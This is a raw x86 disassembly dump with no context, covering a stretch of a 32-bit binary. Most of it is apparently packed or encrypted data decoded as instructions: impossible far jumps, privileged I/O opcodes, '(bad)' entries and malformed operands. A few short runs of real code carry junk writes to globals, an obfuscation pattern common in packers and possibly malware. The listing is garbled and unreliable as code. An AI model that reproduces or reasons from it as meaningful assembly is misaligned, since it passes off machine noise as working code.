  40a4db:	arpl   WORD PTR [edi-0x80],di
  40a4de:	xchg   ecx,eax
  40a4df:	std    
  40a4e0:	mov    BYTE PTR [esi-0x1d],al
  40a4e3:	ja     0x40a493
  40a4e5:	xchg   BYTE PTR [ecx+0x2153ecb7],ah
  40a4eb:	int3   
  40a4ec:	push   esp
  40a4ed:	rcl    DWORD PTR [ecx+ebp*1-0x2c],0xd5
  40a4f2:	dec    ebp
  40a4f3:	enter  0x9209,0x9a
  40a4f7:	rcl    DWORD PTR [edi],cl
  40a4f9:	stos   BYTE PTR es:[edi],al
  40a4fa:	ret    
  40a4fb:	rcl    BYTE PTR [ebx-0x74882b33],1
  40a501:	addr16 cli 
  40a503:	sti    
  40a504:	or     ebx,DWORD PTR [ecx-0x47]
  40a507:	and    DWORD PTR [edi+edx*1+0x35],esp
  40a50b:	aad    0xe9
  40a50d:	xbegin 0x937e4ae
  40a513:	sbb    BYTE PTR [ebp-0x11],ah
  40a516:	or     DWORD PTR [esi],0xd25d60ff
  40a51c:	and    eax,edx
  40a51e:	sub    eax,0xa73defce
  40a523:	leave  
  40a524:	test   eax,0xa8dd210a
  40a529:	mul    DWORD PTR [eax-0x5f7d55ae]
  40a52f:	mov    esp,0x71e2390d
  40a534:	cwde   
  40a535:	cdq    
  40a536:	inc    ebx
  40a537:	sub    al,0x6f
  40a539:	imul   esp,DWORD PTR [edx+0x34d2f458],0xb6806831
  40a543:	fcom   DWORD PTR [edi]
  40a545:	(bad)  
  40a546:	int3   
  40a547:	fcomip st,st(1)
  40a549:	push   esp
  40a54a:	popa   
  40a54b:	push   eax
  40a54c:	rcl    DWORD PTR [edi],0x77
  40a54f:	xchg   DWORD PTR [ebp+eiz*4-0x20],ecx
  40a553:	dec    edx
  40a554:	and    BYTE PTR [edx+edi*4+0x5b],al
  40a558:	mov    ebp,0x617132a3
  40a55d:	push   ecx
  40a55e:	push   ebx
  40a55f:	mov    ds:0x538c5ad6,eax
  40a564:	test   BYTE PTR [edx+edx*2+0x0],ah
  40a568:	jle    0x40a581
  40a56a:	dec    esi
  40a56b:	inc    eax
  40a56c:	or     eax,0x78f366d9
  40a571:	adc    eax,0x6c4a94b1
  40a576:	mov    DWORD PTR ds:0x702b89dd,esp
  40a57c:	sbb    DWORD PTR [ecx+0x9416361],esi
  40a582:	mov    DWORD PTR [ebp-0x37],0xbb2121a2
  40a589:	xchg   edx,eax
  40a58a:	das    
  40a58b:	clc    
  40a58c:	jmp    0x40a54d
  40a58e:	sbb    al,0x4b
  40a590:	xchg   esi,eax
  40a591:	or     al,0x34
  40a593:	imul   edx,DWORD PTR [ebx+0x30d2f6b8],0x14
  40a59a:	lods   al,BYTE PTR ds:[esi]
  40a59b:	ret    0xe810
  40a59e:	scas   al,BYTE PTR es:[edi]
  40a59f:	jle    0x40a57d
  40a5a1:	cmp    ch,ch
  40a5a3:	sahf   
  40a5a4:	jo     0x40a554
  40a5a6:	out    0x11,eax
  40a5a8:	loopne 0x40a626
  40a5aa:	cmp    ah,BYTE PTR [ebp+0x3a]
  40a5ad:	jb     0x40a55f
  40a5af:	stc    
  40a5b0:	push   0xaad8f0ad
  40a5b5:	xlat   BYTE PTR ds:[ebx]
  40a5b6:	jle    0x40a5ec
  40a5b8:	fidivr DWORD PTR [esi+0x497df41a]
  40a5be:	xchg   ebx,eax
  40a5bf:	mov    ?,WORD PTR [eax+0x58]
  40a5c2:	ins    BYTE PTR es:[edi],dx
  40a5c3:	aaa    
  40a5c4:	add    al,0x37
  40a5c6:	out    dx,eax
  40a5c7:	sahf   
  40a5c8:	jmp    0x3623:0x4042fb21
  40a5cf:	(bad)  
  40a5d0:	push   ds
  40a5d1:	popf   
  40a5d2:	aam    0xab
  40a5d4:	pop    ds
  40a5d5:	jo     0x40a654
  40a5d7:	pushf  
  40a5d8:	pop    es
  40a5d9:	fdivrp st(3),st
  40a5db:	mov    esi,0xdaa89ff9
  40a5e0:	push   cs
  40a5e1:	(bad)  
  40a5e2:	retf   0x5067
  40a5e5:	shl    BYTE PTR [eax-0x723f7e13],0xe0
  40a5ec:	imul   esi,DWORD PTR [eax+0x20ff6e1],0x9f5f2a37
  40a5f6:	adc    al,0xa7
  40a5f8:	es and bh,dh
  40a5fb:	int3   
  40a5fc:	arpl   WORD PTR [eax],cx
  40a5fe:	sbb    eax,0xc9f1e098
  40a603:	into   
  40a604:	mov    ds:0xfb6e2d1a,al
  40a609:	inc    esp
  40a60a:	jbe    0x40a5c1
  40a60c:	cld    
  40a60d:	hlt    
  40a60e:	jae    0x40a5b2
  40a610:	inc    ecx
  40a611:	in     al,dx
  40a612:	test   DWORD PTR [edi-0x43b55e22],ecx
  40a618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a619:	sbb    al,0x69
  40a61b:	ins    BYTE PTR es:[edi],dx
  40a61c:	ja     0x40a634
  40a61e:	xlat   BYTE PTR ds:[ebx]
  40a61f:	call   0xc121fa2a
  40a624:	call   0x47d1f7d2
  40a629:	cmp    DWORD PTR [ebp+0x5d],ebx
  40a62c:	aad    0x73
  40a62e:	cwde   
  40a62f:	fidivr DWORD PTR [eax-0x5b]
  40a632:	push   edx
  40a633:	xchg   DWORD PTR ds:[ecx+0x78160f06],esi
  40a63a:	dec    ebp
  40a63b:	imul   ebx,DWORD PTR [ebx+0x402cd98a],0x993a4a97
  40a645:	dec    esi
  40a646:	jle    0x40a6a3
  40a648:	and    BYTE PTR [edx+0x3],0x5f
  40a64c:	data16 sti 
  40a64e:	push   esp
  40a64f:	mov    cl,0xde
  40a651:	or     DWORD PTR [edi],edi
  40a653:	jg     0x40a61d
  40a655:	ret    
  40a656:	dec    ebx
  40a657:	nop
  40a658:	adc    al,0xb4
  40a65a:	cmp    bh,BYTE PTR [ebp+0x39b6a976]
  40a660:	cmp    ecx,DWORD PTR [edi]
  40a662:	clc    
  40a663:	lea    ecx,[ebp+0x4d]
  40a666:	data16 xlat BYTE PTR ds:[ebx]
  40a668:	push   ss
  40a669:	cmp    edx,DWORD PTR [ebx+0x4ae56419]
  40a66f:	jg     0x40a601
  40a671:	push   edi
  40a672:	push   DWORD PTR [edi+0x1dbc1283]
  40a678:	xchg   ecx,eax
  40a679:	test   al,0xf6
  40a67b:	in     eax,dx
  40a67c:	mov    cl,0xcc
  40a67e:	mov    dh,BYTE PTR [edi-0x4f]
  40a681:	dec    edi
  40a682:	js     0x40a6f6
  40a684:	sbb    esi,DWORD PTR [ebp+0x4c]
  40a687:	push   es
  40a688:	sbb    al,0x40
  40a68a:	push   ebx
  40a68b:	xchg   esp,eax
  40a68c:	stos   BYTE PTR es:[edi],al
  40a68d:	dec    edx
  40a68e:	(bad)  
  40a68f:	and    DWORD PTR [eax+ebx*4],esi
  40a692:	sub    BYTE PTR [eax-0x37],bh
  40a695:	ret    
  40a696:	pop    edx
  40a697:	nop
  40a698:	js     0x40a646
  40a69a:	lds    esp,FWORD PTR [esi+edi*1]
  40a69d:	inc    edi
  40a69e:	mov    eax,0xd3506ea2
  40a6a3:	and    dl,BYTE PTR [esi]
  40a6a5:	int    0x79
  40a6a7:	fucomi st,st(2)
  40a6a9:	push   0x14
  40a6ab:	mov    bh,0x5b
  40a6ad:	int3   
  40a6ae:	dec    edi
  40a6af:	adc    BYTE PTR [edi+ebx*1],dh
  40a6b2:	hlt    
  40a6b3:	mov    ebp,DWORD PTR [edx]
  40a6b5:	ins    DWORD PTR es:[edi],dx
  40a6b6:	outs   dx,DWORD PTR ds:[esi]
  40a6b7:	xchg   BYTE PTR [esi],bh
  40a6b9:	pop    esi
  40a6ba:	scas   eax,DWORD PTR es:[edi]
  40a6bb:	iret   
  40a6bc:	lock shr DWORD PTR [esi+ecx*2],1
  40a6c0:	pop    es
  40a6c1:	icebp  
  40a6c2:	popa   
  40a6c3:	jp     0x40a669
  40a6c5:	hlt    
  40a6c6:	loope  0x40a726
  40a6c8:	mov    bl,0x49
  40a6ca:	mov    ds:0x39cffe2d,al
  40a6cf:	add    DWORD PTR [ecx-0x5d28eee9],edi
  40a6d5:	ret    0xb202
  40a6d8:	(bad)  
  40a6d9:	fstp   DWORD PTR [edi]
  40a6db:	xchg   ecx,eax
  40a6dc:	adc    cl,cl
  40a6de:	xchg   esi,eax
  40a6df:	and    ah,al
  40a6e1:	fmulp  st(5),st
  40a6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6e4:	mov    edx,0xd7b5f817
  40a6e9:	sbb    cl,BYTE PTR [eax-0x7c4268d]
  40a6ef:	mov    DWORD PTR ds:0x43376b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x1765ec0c
  40a7ac:	pushf  
  40a7ad:	adc    edx,DWORD PTR [esi]
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	mov    eax,0x2971f505
  40a7bb:	(bad)  
  40a7bd:	(bad)  
  40a7be:	jns    0x40a760
  40a7c0:	cdq    
  40a7c1:	out    dx,eax
  40a7c2:	pop    es
  40a7c3:	xor    edi,eax
  40a7c5:	pushf  
  40a7c6:	pop    ebx
  40a7c7:	push   ds
  40a7c8:	data16 je 0x40a7ec
  40a7cb:	and    eax,0x4b7e6ea7
  40a7d0:	mov    al,0xec
  40a7d2:	lds    eax,FWORD PTR es:[ebx]
  40a7d5:	dec    edi
  40a7d6:	or     ecx,DWORD PTR [edx-0x2334436f]
  40a7dc:	jnp    0x40a83a
  40a7de:	fnstenv [ebp-0x57635559]
  40a7e4:	neg    BYTE PTR [edi+0x14]
  40a7e7:	out    dx,eax
  40a7e8:	pop    ss
  40a7e9:	nop
  40a7ea:	pop    ebx
  40a7eb:	pop    edi
  40a7ec:	xor    ebp,DWORD PTR [esi+0x744a95a5]
  40a7f2:	outs   dx,BYTE PTR ds:[esi]
  40a7f3:	std    
  40a7f4:	sub    BYTE PTR [edi-0x49e1ecc9],bh
  40a7fa:	rol    BYTE PTR [ebp-0x2c],cl
  40a7fd:	inc    ebx
  40a7fe:	clc    
  40a7ff:	mov    ds:0xea3034a8,eax
  40a804:	mov    eax,ds:0x864826ce
  40a809:	outs   dx,DWORD PTR ds:[esi]
  40a80a:	adc    edi,DWORD PTR ds:0x904cf152
  40a810:	stos   BYTE PTR es:[edi],al
  40a811:	out    dx,eax
  40a812:	inc    ebx
  40a813:	xor    bl,BYTE PTR [ecx+0x5]
  40a816:	mov    eax,0xf302850
  40a81b:	push   0x7c
  40a81d:	cmp    DWORD PTR [edx-0x2e37be61],esp
  40a823:	hlt    
  40a824:	in     eax,dx
  40a825:	cmp    ch,BYTE PTR [ebx+0x38579cef]
  40a82b:	cld    
  40a82c:	inc    eax
  40a82d:	retf   
  40a82e:	(bad)  
  40a82f:	pusha  
  40a830:	into   
  40a831:	pop    DWORD PTR [edx-0x23]
  40a834:	push   edx
  40a835:	dec    esi
  40a836:	jmp    0x420385d4
  40a83b:	sbb    ah,ch
  40a83d:	or     eax,0x302796cd
  40a842:	add    al,BYTE PTR gs:[esi+0x34fcf8e8]
  40a849:	pop    ebx
  40a84a:	mov    dl,0x21
  40a84c:	xchg   esp,eax
  40a84d:	arpl   cx,dx
  40a84f:	push   0xf2ce512a
  40a854:	sbb    eax,0x17addf33
  40a859:	mov    dh,BYTE PTR [eax+0x3f]
  40a85c:	pop    ebp
  40a85d:	rol    DWORD PTR [edx+0x4c7a324b],1
  40a863:	rol    DWORD PTR [eax-0x23],0x62
  40a867:	cmp    al,0xf2
  40a869:	loop   0x40a880
  40a86b:	pop    es
  40a86c:	sub    eax,0xd6e37960
  40a871:	(bad)  
  40a872:	push   esp
  40a873:	sahf   
  40a874:	jmp    0x8067:0x788d1611
  40a87b:	scas   al,BYTE PTR es:[edi]
  40a87c:	push   ebx
  40a87d:	mov    eax,ds:0xc32e1d18
  40a882:	cli    
  40a883:	bound  ebx,QWORD PTR [ebx]
  40a885:	fdiv   QWORD PTR [ecx+0x25]
  40a888:	into   
  40a889:	and    BYTE PTR [edx],cl
  40a88b:	(bad)  
  40a88c:	stos   DWORD PTR es:[edi],eax
  40a88d:	nop
  40a88e:	jge    0x40a8b1
  40a890:	aam    0x1b
  40a892:	mov    edx,0x40248262
  40a897:	push   es
  40a898:	shr    ebp,cl
  40a89a:	xchg   ebp,eax
  40a89b:	fucom  st(1)
  40a89d:	push   ecx
  40a89e:	xchg   DWORD PTR [ecx-0x430f51df],edx
  40a8a4:	mov    ebx,0xe507f9f8
  40a8a9:	sbb    ch,BYTE PTR [ecx]
  40a8ab:	bound  ebx,QWORD PTR [ecx]
  40a8ad:	push   edi
  40a8ae:	adc    DWORD PTR [edi],esi
  40a8b0:	popa   
  40a8b1:	out    dx,eax
  40a8b2:	dec    esi
  40a8b3:	popf   
  40a8b4:	pushf  
  40a8b5:	call   FWORD PTR [edx+0x3c]
  40a8b8:	mov    dh,0x15
  40a8ba:	sti    
  40a8bb:	mov    esi,0x79ead4c3
  40a8c0:	ret    0xd6ad
  40a8c3:	pop    es
  40a8c4:	adc    DWORD PTR [esi],edx
  40a8c6:	test   BYTE PTR [ecx-0x32c87c4e],0xf9
  40a8cd:	pop    edi
  40a8ce:	inc    edi
  40a8cf:	jmp    0x7bd7:0xee9cb729
  40a8d6:	cmp    al,0xfc
  40a8d8:	mov    edi,DWORD PTR [ebp+0x67]
  40a8db:	xchg   DWORD PTR [ebx+edi*2+0x7af270ab],esp
  40a8e2:	and    eax,0xadcf4318
  40a8e7:	imul   edx,DWORD PTR [ebp-0x37d2bfe1],0x5a6cf095
  40a8f1:	mov    al,ds:0x40b229d5
  40a8f6:	jle    0x40a96c
  40a8f8:	rcr    DWORD PTR [eax+0x134db3b2],1
  40a8fe:	imul   edi,DWORD PTR [ebp+0x5b734921],0xffffffe8
  40a905:	adc    edx,DWORD PTR [ecx-0x6493375f]
  40a90b:	push   ebx
  40a90c:	test   DWORD PTR [ebx+eiz*2+0x20af8639],esp
  40a913:	shl    DWORD PTR [ebp+0x5880ee1d],1
  40a919:	fnsave gs:[esi-0x19]
  40a91d:	dec    ebp
  40a91e:	int    0x5f
  40a920:	push   cs
  40a921:	pop    DWORD PTR [eax-0x41]
  40a924:	and    edi,ecx
  40a926:	push   ecx
  40a927:	push   ebp
  40a928:	shl    DWORD PTR [eax-0x58],0xd3
  40a92c:	adc    DWORD PTR [ebx-0x59],eax
  40a92f:	(bad)  
  40a930:	ds push ecx
  40a932:	fadd   st,st(3)
  40a934:	inc    ecx
  40a935:	jns    0x40a97c
  40a937:	popw   es
  40a939:	mov    esp,0x3d92d1d3
  40a93e:	mov    esi,0xc9ad43d7
  40a943:	inc    ecx
  40a944:	adc    BYTE PTR [edi],0xa0
  40a947:	outs   dx,BYTE PTR ds:[esi]
  40a948:	jo     0x40a8ff
  40a94a:	in     al,0x81
  40a94c:	jmp    0x2d46b767
  40a951:	mov    ch,0x80
  40a953:	test   BYTE PTR [ebx+edi*4-0x58308797],0x66
  40a95b:	imul   eax,ebp,0xffffff9d
  40a95e:	loopne 0x40a920
  40a960:	enter  0xc5eb,0x17
  40a964:	jb     0x40a9cf
  40a966:	add    ch,dh
  40a968:	repz iret 
  40a96a:	(bad)  
  40a96b:	jnp    0x40a938
  40a96d:	das    
  40a96e:	jnp    0x40a98f
  40a970:	bound  ebx,QWORD PTR [ebp+0xe]
  40a973:	jo     0x40a989
  40a975:	cmp    bl,BYTE PTR [ebx]
  40a977:	mov    ecx,0x3df49d3d
  40a97c:	out    dx,al
  40a97d:	pop    esi
  40a97e:	ins    BYTE PTR es:[edi],dx
  40a97f:	cmp    BYTE PTR [eax],dl
  40a981:	out    dx,al
  40a982:	inc    ebx
  40a983:	pop    edi
  40a984:	sbb    ebx,eax
  40a986:	scas   al,BYTE PTR es:[edi]
  40a987:	sbb    DWORD PTR [esi],esi
  40a989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a98a:	gs popa 
  40a98c:	ja     0x40a956
  40a98e:	add    bl,BYTE PTR [ebp+0x12224c84]
  40a994:	xlat   BYTE PTR ds:[ebx]
  40a995:	push   ss
  40a996:	daa    
  40a997:	add    eax,0xdec89810
  40a99c:	mov    dh,0xc0
  40a99e:	aas    
  40a99f:	cmp    BYTE PTR [ebp+ebp*4+0x12],bh
  40a9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9a4:	mov    ecx,0x1793c391
  40a9a9:	xchg   edx,eax
  40a9aa:	jmp    0xabbe:0x8584f27f
  40a9b1:	dec    edx
  40a9b2:	rcr    edi,cl
  40a9b4:	leave  
  40a9b5:	sub    ecx,DWORD PTR [eax-0x2b74cacf]
  40a9bb:	dec    ecx
  40a9bc:	data16 jo 0x40a959
  40a9bf:	pop    ss
  40a9c0:	mov    ebp,ds
  40a9c2:	mov    dh,0xbf
  40a9c4:	(bad)  
  40a9c5:	cld    
  40a9c6:	lock test eax,0x2a2fd62b
  40a9cc:	push   edi
  40a9cd:	rcr    BYTE PTR [eax-0x46],1
  40a9d0:	lods   al,BYTE PTR ds:[esi]
  40a9d1:	push   ebx
  40a9d2:	pop    ecx
  40a9d3:	lods   eax,DWORD PTR ds:[esi]
  40a9d4:	adc    BYTE PTR [ebp-0x66],bl
  40a9d7:	mov    esp,0x8b64bd4b
  40a9dc:	ret    0x9c11
  40a9df:	out    0x6f,al
  40a9e1:	rol    DWORD PTR [eax],0xd1
  40a9e4:	mov    esi,?
  40a9e6:	xor    eax,0xf3af504
  40a9eb:	jae    0x40a9e4
  40a9ed:	nop
  40a9ee:	cmp    DWORD PTR [ecx-0x28],esp
  40a9f1:	shl    edi,0x7b
  40a9f4:	in     eax,0x80
  40a9f6:	push   ebx
  40a9f7:	stc    
  40a9f8:	lods   eax,DWORD PTR ds:[esi]
  40a9f9:	push   ecx
  40a9fa:	(bad)  
  40a9fb:	adc    BYTE PTR [ecx+0x458bec45],cl
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	into   
  40aa35:	lods   eax,DWORD PTR ds:[esi]
  40aa36:	loop   0x40aa8a
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	sbb    DWORD PTR [edi],edi
  40aa42:	cmp    eax,0xd7102bc9
  40aa47:	mov    al,0xbd
  40aa49:	sub    DWORD PTR [edi+ebp*4+0x79],ebx
  40aa4d:	sub    DWORD PTR [esi-0x2a7c7f7c],esi
  40aa53:	fcomip st,st(1)
  40aa55:	dec    ebx
  40aa56:	iret   
  40aa57:	fldcw  WORD PTR [ecx+0x34c343de]
  40aa5d:	and    al,0x1f
  40aa5f:	or     al,0x1a
  40aa61:	inc    esi
  40aa62:	jb     0x40aa3e
  40aa64:	adc    al,0x5
  40aa66:	into   
  40aa67:	pushf  
  40aa68:	xor    BYTE PTR [edx+ebp*2+0x5a5b7c21],bl
  40aa6f:	mov    ecx,0x65961842
  40aa74:	mov    ah,0xdc
  40aa76:	mov    ch,0x7b
  40aa78:	inc    esi
  40aa79:	or     ebp,0x324f5748
  40aa7f:	repnz lds edi,FWORD PTR [edx]
  40aa82:	(bad)  
  40aa83:	neg    BYTE PTR [ebx+0x1b]
  40aa86:	and    ch,BYTE PTR [edi]
  40aa88:	pop    ecx
  40aa89:	js     0x40aa60
  40aa8b:	addr16 int3 
  40aa8d:	inc    ebp
  40aa8e:	push   esp
  40aa8f:	cmp    dl,BYTE PTR [edx-0x2e83d577]
  40aa95:	outs   dx,BYTE PTR ds:[esi]
  40aa96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa97:	mov    dh,0x68
  40aa99:	mov    ebx,0xc864aec8
  40aa9e:	cmc    
  40aa9f:	fimul  WORD PTR [edx+0x30]
  40aaa2:	int3   
  40aaa3:	in     eax,0xfa
  40aaa5:	fs or  al,0x43
  40aaa8:	lea    eax,[esi+0x5c677142]
  40aaae:	sub    BYTE PTR [ebp-0xbf67181],ah
  40aab4:	fwait
  40aab5:	mov    bh,al
  40aab7:	pop    ebx
  40aab8:	or     eax,0xe47018d8
  40aabd:	fnstsw WORD PTR [esi]
  40aabf:	jo     0x40aaa8
  40aac1:	add    cl,BYTE PTR [eax]
  40aac3:	in     eax,0xcd
  40aac5:	jae    0x40ab36
  40aac7:	push   esp
  40aac8:	lock xchg edi,eax
  40aaca:	sbb    esp,edi
  40aacc:	sbb    eax,0xb5356f29
  40aad1:	push   ds
  40aad2:	xlat   BYTE PTR ds:[ebx]
  40aad3:	pop    edx
  40aad4:	and    eax,0x8916a2f2
  40aad9:	pusha  
  40aada:	rol    ebp,1
  40aadc:	add    al,0x53
  40aade:	test   DWORD PTR [ebx+0x4c3eccde],edi
  40aae4:	jle    0x40aa91
  40aae6:	adc    DWORD PTR [edx+ecx*4+0x10],0xca88a757
  40aaee:	xchg   ecx,eax
  40aaef:	dec    ecx
  40aaf0:	jmp    DWORD PTR [edx-0x6c20f341]
  40aaf6:	pop    es
  40aaf7:	ficom  WORD PTR [edi]
  40aaf9:	fs ins DWORD PTR es:[edi],dx
  40aafb:	in     eax,dx
  40aafc:	ins    BYTE PTR es:[edi],dx
  40aafd:	jecxz  0x40aae9
  40aaff:	jne    0x40ab26
  40ab01:	dec    eax
  40ab02:	mov    ebx,0xde701460
  40ab07:	mov    cl,dl
  40ab09:	pop    ebp
  40ab0a:	test   BYTE PTR [edx],dh
  40ab0c:	es leave 
  40ab0e:	push   esi
  40ab0f:	js     0x40ab16
  40ab11:	out    0x12,al
  40ab13:	enter  0xc845,0x96
  40ab17:	jno    0x40ab65
  40ab19:	sub    esi,esi
  40ab1b:	jmp    0x40ab87
  40ab1d:	or     al,0x80
  40ab1f:	fs inc esi
  40ab21:	push   eax
  40ab22:	xchg   edi,eax
  40ab23:	and    ah,bl
  40ab25:	push   edi
  40ab26:	outs   dx,BYTE PTR ds:[esi]
  40ab27:	cli    
  40ab28:	es push 0x11c31819
  40ab2e:	xor    dl,dl
  40ab30:	ins    BYTE PTR es:[edi],dx
  40ab31:	sar    DWORD PTR [esi],1
  40ab33:	xchg   dh,dl
  40ab35:	inc    ecx
  40ab36:	mov    ds:0x550bac37,al
  40ab3b:	out    0x39,eax
  40ab3d:	push   ebx
  40ab3e:	dec    ecx
  40ab3f:	adc    DWORD PTR [eax],ebx
  40ab41:	ds fs push 0xf9f8caf5
  40ab48:	adc    BYTE PTR [edi-0x62891ed1],0x82
  40ab4f:	cmp    BYTE PTR [eax],0x11
  40ab52:	inc    edx
  40ab53:	loope  0x40aba3
  40ab55:	sbb    ecx,ebx
  40ab57:	ret    
  40ab58:	xchg   ebp,eax
  40ab59:	sub    bh,0x27
  40ab5c:	and    eax,ebp
  40ab5e:	es stos BYTE PTR es:[edi],al
  40ab60:	add    eax,0x478416c3
  40ab65:	jbe    0x40ab75
  40ab67:	stos   DWORD PTR es:[edi],eax
  40ab68:	jnp    0x40ab6b
  40ab6a:	lock mov bl,0x8b
  40ab6d:	rcl    DWORD PTR [ebx-0x455b448d],1
  40ab73:	imul   esi,eax,0xe4d3fdfa
  40ab79:	ins    DWORD PTR es:[edi],dx
  40ab7a:	push   edi
  40ab7b:	cmp    ebx,esi
  40ab7d:	dec    edx
  40ab7e:	mov    bh,0xbb
  40ab80:	int3   
  40ab81:	jb     0x40abfc
  40ab83:	js     0x40ab61
  40ab85:	mov    dl,0x5e
  40ab87:	shr    edx,1
  40ab89:	or     bh,BYTE PTR [edi+0x3a]
  40ab8c:	pop    esp
  40ab8d:	out    0xad,eax
  40ab8f:	loope  0x40abe0
  40ab91:	and    eax,0xf3a2210a
  40ab96:	out    dx,al
  40ab97:	mov    ah,0x67
  40ab99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab9a:	xlat   BYTE PTR ds:[ebx]
  40ab9b:	or     DWORD PTR [edi-0x1eaf910],esi
  40aba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba3:	imul   esp,DWORD PTR ds:0x91941a76,0x94b80c65
  40abad:	addr16 in al,0xd7
  40abb0:	xchg   esi,eax
  40abb1:	pop    ebx
  40abb2:	ins    DWORD PTR es:[edi],dx
  40abb3:	das    
  40abb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb5:	(bad)  
  40abb6:	mov    ebx,DWORD PTR [ebx]
  40abb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abb9:	sti    
  40abba:	dec    eax
  40abbb:	sbb    ebp,edi
  40abbd:	call   DWORD PTR [esi+0x13a8a9a9]
  40abc3:	sti    
  40abc4:	lods   eax,DWORD PTR ds:[esi]
  40abc5:	jns    0x40abd3
  40abc7:	(bad)  
  40abc8:	outs   dx,BYTE PTR ds:[esi]
  40abc9:	cmp    edi,eax
  40abcb:	jmp    0xbd0f:0x6c73a9d6
  40abd2:	pushf  
  40abd3:	cld    
  40abd4:	jmp    0x6f2fcfb0
  40abd9:	gs mov esi,0xedc50e60
  40abdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abe0:	xchg   ecx,eax
  40abe1:	pop    edx
  40abe2:	es dec ebp
  40abe4:	(bad)  
  40abe5:	or     al,0x4e
  40abe7:	cwde   
  40abe8:	inc    eax
  40abe9:	loope  0x40abb5
  40abeb:	outs   dx,BYTE PTR ds:[esi]
  40abec:	popf   
  40abed:	sbb    cl,BYTE PTR [edx+ecx*8+0x24]
  40abf1:	jae    0x40abe9
  40abf3:	or     al,0x6c
  40abf5:	popf   
  40abf6:	push   edi
  40abf7:	fimul  DWORD PTR [edi]
  40abf9:	lea    ecx,[esi+0x25]
  40abfc:	sub    cl,BYTE PTR [eax-0x25c7e46b]
  40ac02:	jo     0x40ac38
  40ac04:	push   es
  40ac05:	adc    DWORD PTR [ebp-0x7b990e00],ebx
  40ac0b:	add    DWORD PTR [esi-0x3],0xf633178b
  40ac12:	ja     0x40ac2b
  40ac14:	mov    ?,WORD PTR [ebx-0x6200ca24]
  40ac1a:	fnstenv [ebx+0x7f1da373]
  40ac20:	leave  
  40ac21:	inc    esi
  40ac22:	and    al,0xea
  40ac24:	push   ebx
  40ac25:	push   ebx
  40ac26:	ss retf 
  40ac28:	sub    cl,dh
  40ac2a:	push   ebp
  40ac2b:	dec    ebp
  40ac2c:	les    eax,FWORD PTR [eax-0x77]
  40ac2f:	in     al,0x44
  40ac31:	mov    dl,0x30
  40ac33:	mov    al,ds:0x1ef89c35
  40ac38:	push   ss
  40ac39:	ja     0x40ac47
  40ac3b:	into   
  40ac3c:	mov    bl,0x31
  40ac3e:	repz js 0x40abc9
  40ac41:	outs   dx,BYTE PTR ds:[esi]
  40ac42:	call   0x6a7e:0x8f43710f
  40ac49:	jb     0x40ac73
  40ac4b:	enter  0x3026,0x35
  40ac4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac50:	or     al,BYTE PTR [ebx+0x20]
  40ac53:	xchg   ecx,eax
  40ac54:	cmp    ah,BYTE PTR [ebx-0x3a55a486]
  40ac5a:	loope  0x40abef
  40ac5c:	mov    edx,0x563e9fe0
  40ac62:	test   dh,0x93
  40ac65:	pop    ss
  40ac66:	xchg   esi,edi
  40ac68:	stos   DWORD PTR es:[edi],eax
  40ac69:	pushf  
  40ac6a:	sbb    eax,0xde088320
  40ac6f:	lahf   
  40ac70:	sti    
  40ac71:	outs   dx,DWORD PTR ds:[esi]
  40ac72:	cmp    al,BYTE PTR [esi]
  40ac74:	cmp    DWORD PTR [edx+0x3c936d87],eax
